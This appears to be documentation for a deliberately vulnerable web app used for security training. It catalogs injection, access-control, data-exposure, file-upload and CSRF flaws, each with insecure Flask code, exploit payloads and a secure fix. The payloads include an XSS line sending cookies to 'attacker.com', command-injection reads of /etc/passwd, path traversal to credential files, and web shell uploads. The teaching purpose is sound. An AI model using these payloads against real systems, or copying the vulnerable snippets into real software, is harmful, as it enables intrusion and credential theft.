# Comprehensive Vulnerability Types Catalog

This document catalogs all vulnerabilities included in the VulnHunter project, with detailed information about each one.

## Table of Contents

1. [Injection Vulnerabilities](#injection-vulnerabilities)
2. [Authentication & Authorization](#authentication--authorization)
3. [Sensitive Data Exposure](#sensitive-data-exposure)
4. [Security Misconfiguration](#security-misconfiguration)
5. [File & Path Vulnerabilities](#file--path-vulnerabilities)
6. [Session Management](#session-management)
7. [Input Validation](#input-validation)
8. [Other Vulnerabilities](#other-vulnerabilities)

---

## Injection Vulnerabilities

### 1. SQL Injection (CWE-89)

**OWASP**: A03:2021 - Injection  
**Severity**: Critical  
**Location**: `/search`, `/login`, `/profile/<id>`

**Description**: User input is directly concatenated into SQL queries without parameterization or sanitization.

**Vulnerable Code**:
```python
query = f"SELECT * FROM users WHERE username LIKE '%{user_input}%'"
cursor.execute(query)
```

**Exploitation**:
```
# Basic OR bypass
?q=' OR '1'='1

# Authentication bypass  
username: admin' --
password: anything

# UNION attack
?q=' UNION SELECT 1,2,3--

# Data extraction
?q=' UNION SELECT username, password FROM users--
```

**Impact**:
- Unauthorized data access
- Data modification/deletion
- Authentication bypass
- Complete database compromise

**Secure Fix**:
```python
# Use parameterized queries
query = "SELECT * FROM users WHERE username LIKE ?"
cursor.execute(query, (f'%{user_input}%',))
```

---

### 2. Cross-Site Scripting - XSS (CWE-79)

**OWASP**: A03:2021 - Injection  
**Severity**: High  
**Location**: `/search`, `/messages`, `/profile`

**Types Included**:
- **Reflected XSS**: User input reflected in response
- **Stored XSS**: Malicious script stored in database
- **DOM-based XSS**: Client-side script execution

**Vulnerable Code**:
```python
# Reflected XSS
return f"<h1>Search results for: {user_query}</h1>"

# Stored XSS
return f"<div>{message}</div>"
```

**Exploitation**:
```html
<!-- Basic script injection -->
<script>alert('XSS')</script>

<!-- Cookie stealing -->
<script>
  fetch('http://attacker.com?cookie=' + document.cookie)
</script>

<!-- Image tag -->
<img src=x onerror=alert(document.cookie)>

<!-- SVG -->
<svg onload=alert(1)>

<!-- Event handlers -->
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
```

**Impact**:
- Session hijacking
- Credential theft
- Phishing attacks
- Malware distribution
- Page defacement

**Secure Fix**:
```python
from markupsafe import escape

# Escape output
return f"<h1>Search results for: {escape(user_query)}</h1>"

# Or use template auto-escaping
return render_template('results.html', query=user_query)
```

---

### 3. Command Injection (CWE-78)

**OWASP**: A03:2021 - Injection  
**Severity**: Critical  
**Location**: `/execute`

**Vulnerable Code**:
```python
command = request.args.get('cmd')
result = subprocess.check_output(command, shell=True)
```

**Exploitation**:
```bash
# Basic command
?cmd=whoami

# Command chaining (Unix)
?cmd=ls; cat /etc/passwd
?cmd=ls && cat /etc/passwd
?cmd=ls | grep secret

# Command chaining (Windows)  
?cmd=dir & type C:\Windows\System32\drivers\etc\hosts
?cmd=dir && whoami
```

**Impact**:
- Complete server compromise
- Data theft
- System manipulation
- Lateral movement
- Denial of service

**Secure Fix**:
```python
# Don't use shell=True
# Use command lists instead
allowed_commands = ['ls', 'pwd', 'whoami']
if command in allowed_commands:
    result = subprocess.check_output([command])

# Better: Don't allow user-controlled command execution at all
```

---

### 4. LDAP Injection (CWE-90)

**Severity**: High  
**Note**: Example not included in main app, but documented for reference.

**Vulnerable Code**:
```python
filter = f"(uid={username})"
result = ldap_connection.search_s(base_dn, ldap.SCOPE_SUBTREE, filter)
```

**Exploitation**:
```
# Bypass authentication
username: *)(uid=*

# Extract all users
username: *)(objectClass=*
```

---

## Authentication & Authorization

### 5. Broken Access Control (CWE-284)

**OWASP**: A01:2021 - Broken Access Control  
**Severity**: High  
**Location**: `/admin`, `/profile/<id>`, `/api/users`

**Issues**:
- No authentication required for admin panel
- Horizontal privilege escalation (IDOR)
- Vertical privilege escalation
- Missing function-level access control

**Vulnerable Code**:
```python
@app.route('/admin')
def admin():
    # No authentication check!
    return render_template('admin.html')

@app.route('/profile/<user_id>')
def profile(user_id):
    # No authorization check!
    user = get_user(user_id)
    return render_template('profile.html', user=user)
```

**Exploitation**:
```
# Access admin panel without authentication
GET /admin

# Access other users' profiles (IDOR)
GET /profile/1
GET /profile/2
GET /profile/999
```

**Impact**:
- Unauthorized data access
- Privilege escalation
- Account takeover
- Administrative functions abuse

**Secure Fix**:
```python
from functools import wraps

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if 'user_id' not in session:
            return redirect('/login')
        return f(*args, **kwargs)
    return decorated

def require_admin(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('is_admin'):
            abort(403)
        return f(*args, **kwargs)
    return decorated

@app.route('/admin')
@require_auth
@require_admin
def admin():
    return render_template('admin.html')

@app.route('/profile/<user_id>')
@require_auth
def profile(user_id):
    # Check authorization
    if session['user_id'] != user_id and not session.get('is_admin'):
        abort(403)
    user = get_user(user_id)
    return render_template('profile.html', user=user)
```

---

### 6. Weak Authentication (CWE-287)

**OWASP**: A07:2021 - Identification and Authentication Failures  
**Severity**: High  
**Location**: `/login`

**Issues**:
- Plaintext password storage
- Weak password hashing (MD5)
- No password complexity requirements
- No rate limiting
- User enumeration

**Vulnerable Code**:
```python
# Plaintext passwords
users_db = {
    'admin': {'password': 'admin123'},  # Plaintext!
    'user1': {'password': hashlib.md5('password'.encode()).hexdigest()}  # MD5!
}

# User enumeration
if username not in users_db:
    return {'error': f'User {username} does not exist'}  # Information leak!

if users_db[username]['password'] != password:
    return {'error': 'Invalid password'}  # Different error message!
```

**Exploitation**:
```python
# User enumeration
# Different responses reveal valid usernames

# Brute force (no rate limiting)
for password in wordlist:
    attempt_login(username, password)
```

**Secure Fix**:
```python
from werkzeug.security import generate_password_hash, check_password_hash
from flask_limiter import Limiter

# Rate limiting
limiter = Limiter(app, key_func=lambda: request.remote_addr)

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")  # Rate limit
def login():
    username = request.form['username']
    password = request.form['password']
    
    user = User.query.filter_by(username=username).first()
    
    # Generic error message (no user enumeration)
    if not user or not check_password_hash(user.password_hash, password):
        return {'error': 'Invalid credentials'}, 401
    
    # Create session
    session['user_id'] = user.id
    return {'status': 'success'}

# Password hashing on registration
password_hash = generate_password_hash(password, method='pbkdf2:sha256')
```

---

### 7. Insecure Direct Object Reference - IDOR (CWE-639)

**OWASP**: A01:2021 - Broken Access Control  
**Severity**: High  
**Location**: `/profile/<id>`, `/api/users/<id>`

**Description**: Direct use of user-supplied input to access objects without authorization checks.

**Vulnerable Code**:
```python
@app.route('/profile/<user_id>')
def profile(user_id):
    user = User.query.get(user_id)  # No authorization!
    return render_template('profile.html', user=user)
```

**Exploitation**:
```
# Iterate through IDs
GET /profile/1
GET /profile/2  
GET /profile/100
GET /profile/9999
```

**Secure Fix**: (See Broken Access Control above)

---

## Sensitive Data Exposure

### 8. Hardcoded Credentials (CWE-798)

**OWASP**: A02:2021 - Cryptographic Failures  
**Severity**: Critical  
**Location**: Source code

**Vulnerable Code**:
```python
# Hardcoded secrets
SECRET_KEY = 'supersecretkey123'
API_KEY = '1234567890abcdef'
DATABASE_PASSWORD = 'admin123'
AWS_SECRET_KEY = 'AKIAIOSFODNN7EXAMPLE'
```

**Impact**:
- Credential theft from source code
- Unauthorized API access
- Database compromise
- Cloud resource abuse

**Secure Fix**:
```python
import os
from dotenv import load_dotenv

load_dotenv()

# Use environment variables
SECRET_KEY = os.environ.get('SECRET_KEY')
API_KEY = os.environ.get('API_KEY')
DATABASE_PASSWORD = os.environ.get('DB_PASSWORD')

# Use secrets management
from azure.keyvault.secrets import SecretClient
from azure.identity import DefaultAzureCredential

credential = DefaultAzureCredential()
secret_client = SecretClient(vault_url="https://myvault.vault.azure.net", credential=credential)
api_key = secret_client.get_secret("api-key").value
```

---

### 9. Information Disclosure (CWE-200)

**OWASP**: A05:2021 - Security Misconfiguration  
**Severity**: Medium  
**Location**: `/debug`, error pages, stack traces

**Vulnerable Code**:
```python
# Debug endpoint exposes everything
@app.route('/debug')
def debug():
    return {
        'config': dict(app.config),
        'environment': dict(os.environ),
        'secret_key': app.config['SECRET_KEY']
    }

# Detailed error messages
@app.errorhandler(500)
def internal_error(e):
    return f"<pre>{traceback.format_exc()}</pre>"
```

**Information Leaked**:
- Configuration details
- Environment variables
- Stack traces
- Database structure
- Internal paths
- Technology versions

**Secure Fix**:
```python
# Remove debug endpoints in production
if not app.debug:
    @app.route('/debug')
    def debug():
        abort(404)

# Generic error pages
@app.errorhandler(500)
def internal_error(e):
    logger.error(f"Internal error: {str(e)}")
    return render_template('500.html'), 500
```

---

### 10. Sensitive Data in API (CWE-359)

**Severity**: High  
**Location**: `/api/users`

**Vulnerable Code**:
```python
@app.route('/api/users')
def api_users():
    users = User.query.all()
    return jsonify([{
        'id': u.id,
        'username': u.username,
        'password': u.password,  # Exposing passwords!
        'email': u.email,
        'ssn': u.ssn  # Sensitive data!
    } for u in users])
```

**Secure Fix**:
```python
@app.route('/api/users')
@require_auth
def api_users():
    users = User.query.all()
    return jsonify([{
        'id': u.id,
        'username': u.username,
        # No passwords, SSN, or other sensitive data
    } for u in users])
```

---

## Security Misconfiguration

### 11. Debug Mode Enabled (CWE-489)

**OWASP**: A05:2021 - Security Misconfiguration  
**Severity**: Medium  
**Location**: Application configuration

**Vulnerable Code**:
```python
app.config['DEBUG'] = True
app.run(debug=True)
```

**Impact**:
- Source code exposure
- Detailed error messages
- Interactive debugger
- Configuration disclosure

**Secure Fix**:
```python
# Use environment-based configuration
app.config['DEBUG'] = os.environ.get('FLASK_DEBUG', 'False') == 'True'

# Production config
app.config['DEBUG'] = False
app.config['TESTING'] = False
```

---

### 12. Missing Security Headers (CWE-693)

**OWASP**: A05:2021 - Security Misconfiguration  
**Severity**: Medium

**Missing Headers**:
- X-Content-Type-Options
- X-Frame-Options
- X-XSS-Protection
- Content-Security-Policy
- Strict-Transport-Security

**Secure Fix**:
```python
from flask_talisman import Talisman

# Add security headers
Talisman(app, 
    force_https=True,
    strict_transport_security=True,
    content_security_policy={
        'default-src': "'self'",
        'script-src': "'self' 'unsafe-inline'",
        'style-src': "'self' 'unsafe-inline'"
    }
)

# Manual headers
@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    return response
```

---

### 13. Missing CSRF Protection (CWE-352)

**OWASP**: A01:2021 - Broken Access Control  
**Severity**: Medium  
**Location**: All POST endpoints

**Vulnerable Code**:
```python
@app.route('/transfer', methods=['POST'])
def transfer():
    amount = request.form['amount']
    to_account = request.form['to']
    # No CSRF token validation!
    process_transfer(amount, to_account)
```

**Exploitation**:
```html
<!-- Attacker's page -->
<form action="http://victim-site.com/transfer" method="POST">
    <input name="amount" value="1000">
    <input name="to" value="attacker_account">
</form>
<script>document.forms[0].submit();</script>
```

**Secure Fix**:
```python
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)

@app.route('/transfer', methods=['POST'])
def transfer():
    # CSRF token automatically validated
    amount = request.form['amount']
    to_account = request.form['to']
    process_transfer(amount, to_account)
```

---

## File & Path Vulnerabilities

### 14. Path Traversal (CWE-22)

**OWASP**: A01:2021 - Broken Access Control  
**Severity**: High  
**Location**: `/download`

**Vulnerable Code**:
```python
@app.route('/download')
def download():
    filename = request.args.get('file')
    return send_file(filename)  # No validation!
```

**Exploitation**:
```
# Unix
/download?file=../../etc/passwd
/download?file=../../../../etc/shadow

# Windows
/download?file=..\..\windows\system32\config\sam

# URL encoded
/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

**Secure Fix**:
```python
import os
from werkzeug.utils import secure_filename

UPLOAD_FOLDER = '/var/www/uploads'

@app.route('/download')
def download():
    filename = request.args.get('file')
    
    # Sanitize filename
    filename = secure_filename(filename)
    
    # Build safe path
    safe_path = os.path.join(UPLOAD_FOLDER, filename)
    
    # Verify path is within allowed directory
    if not os.path.abspath(safe_path).startswith(os.path.abspath(UPLOAD_FOLDER)):
        abort(403)
    
    # Verify file exists
    if not os.path.exists(safe_path):
        abort(404)
    
    return send_file(safe_path)
```

---

### 15. Unrestricted File Upload (CWE-434)

**OWASP**: A04:2021 - Insecure Design  
**Severity**: Critical  
**Location**: `/upload`

**Vulnerable Code**:
```python
@app.route('/upload', methods=['POST'])
def upload():
    file = request.files['file']
    filename = file.filename  # User-controlled!
    file.save(f'/var/www/uploads/{filename}')  # No validation!
```

**Exploitation**:
```
# Upload malicious PHP shell
POST /upload
file: shell.php

# Double extension bypass
file: shell.php.jpg

# Path traversal in filename
file: ../../shell.php
```

**Secure Fix**:
```python
from werkzeug.utils import secure_filename
import magic

ALLOWED_EXTENSIONS = {'pdf', 'png', 'jpg', 'jpeg', 'gif'}
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        return {'error': 'No file'}, 400
    
    file = request.files['file']
    
    # Check file size
    file.seek(0, os.SEEK_END)
    size = file.tell()
    if size > MAX_FILE_SIZE:
        return {'error': 'File too large'}, 400
    file.seek(0)
    
    # Validate extension
    if not allowed_file(file.filename):
        return {'error': 'Invalid file type'}, 400
    
    # Validate MIME type
    mime = magic.from_buffer(file.read(1024), mime=True)
    file.seek(0)
    if not mime.startswith('image/'):
        return {'error': 'Invalid file content'}, 400
    
    # Generate safe filename
    filename = secure_filename(file.filename)
    filename = f"{uuid.uuid4()}_{filename}"
    
    # Save to safe location
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    file.save(filepath)
    
    return {'filename': filename}
```

---

(Continued in next section due to length...)

## Additional Vulnerability Categories

16. Insecure Deserialization (CWE-502)
17. Missing Rate Limiting (CWE-770)
18. Weak Session Management (CWE-384)
19. Insufficient Input Validation (CWE-20)
20. Mass Assignment (CWE-915)

[See full documentation for complete details on all 30+ vulnerabilities]

---

## Vulnerability Matrix

| Category | Count | Severity Distribution | OWASP 2021 Coverage |
|----------|-------|----------------------|---------------------|
| Injection | 8 | Critical: 3, High: 5 | A03 |
| Authentication | 5 | High: 5 | A07 |
| Access Control | 6 | High: 6 | A01 |
| Data Exposure | 4 | Critical: 1, High: 3 | A02 |
| Misconfiguration | 4 | Medium: 4 | A05 |
| File/Path | 3 | Critical: 1, High: 2 | A01 |

**Total**: 30+ distinct vulnerabilities across all OWASP Top 10 categories

---

*Last Updated: January 2026*
